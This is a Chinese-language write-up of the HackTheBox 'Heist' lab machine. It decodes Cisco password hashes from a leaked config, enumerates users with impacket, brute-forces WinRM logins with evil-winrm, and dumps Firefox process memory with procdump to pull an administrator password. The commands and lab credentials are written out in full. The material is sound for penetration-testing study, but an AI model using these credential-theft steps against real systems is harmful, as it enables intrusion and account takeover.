---
title: hackthebox-Heist
mathjax: false
date: 2019-11-03 20:19:09
categories:
 - 渗透测试
 - hackthebox
tags:
 - hackthebox
---

![](/img/heist/1.png)

不同用户名可能对应相同的密码

<!-- more -->

* `nmap`扫描，`-p1-65535`，得到端口`80`、`135`、`445`、`5985`、`49668`

```
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp open  msrpc         Microsoft Windows RPC
445/tcp open  microsoft-ds?
5985/tcp  open  wsman
49668/tcp open  unknown
```

* 查看`http://10.10.10.149`，在`Login as guest`中下载`Attachment`的`config.txt`

![](/img/heist/2.png)

![](/img/heist/3.png)

```
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0 mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
```

* `config.txt`中提到Cisco的3个密码，2个为`type7`可直接解密，1个为`type5`使用`hashcat`解密；同时搜集到三个用户名`rout3r`、`admin`、`Hazard`，推测`Hazard`和`type5`的密码`stealth1agent`有关

* 使用[`impacket`](https://github.com/SecureAuthCorp/impacket)的`lookupsid.py`搜索其它用户名，发现`support`、`Chase`和`Jason`
  
  ```sh
  ./lookupsid.py Hazard:stealth1agent@10.10.10.149
  ```

* 使用`evil-winrm`，用上述发现的用户名和密码组成的字典进行爆破，获得`Chase`的密码
  
  ```sh
  ruby evil-winrm.rb -i 10.10.10.149 -u Chase -p 'Q4)sJu\Y8qz*A3?d'
  ```

  获得`user.txt`

![](/img/heist/4.png)

* 查看`Users`目录发现主机用户有`Administrator`、`Chase`和`Hazard`

* 枚举进程，发现`firefox`

![](/img/heist/5.png)

* 在`evil-winrm`中`upload`工具`procdump64.exe`，将`firefox`的进程内存dump下来
  ```sh
  ./Procdump64.exe -accepteula -ma 6276 firefox-6276.dmp
  ```

* 搜索内存得到新密码
  ```sh
  select-string firefox-6276.dmp -pattern "password" # login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
  ```

* 使用`evil-winrm`以`Administrator`和新密码登录，获得`root.txt`

![](/img/heist/6.png)